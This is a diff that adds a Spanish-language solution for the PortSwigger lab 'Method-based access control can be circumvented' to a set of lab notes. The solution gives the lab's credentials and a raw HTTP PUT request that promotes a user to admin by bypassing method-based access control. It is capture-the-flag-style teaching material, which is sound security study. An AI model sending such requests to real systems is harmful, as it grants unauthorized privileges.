@@ -1103,6 +1103,21 @@ X-Original-URL: /admin/delete
 
 ```
 
+### [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
+
+#### Solución:
+
+1. Iniciar sesión con las credenciales brindadas (wiener:peter)
+2. Realizar la siguiente request, reemplazando LABID y COOKIE-SESSION-VALUE:
+
+```
+PUT /admin-roles HTTP/1.1
+Host: LABID.web-security-academy.net
+Cookie: session=COOKIE-SESSION-VALUE
+
+username=wiener&action=upgrade
+```
+
 ---
 
 ## [Authentication](https://portswigger.net/web-security/authentication)
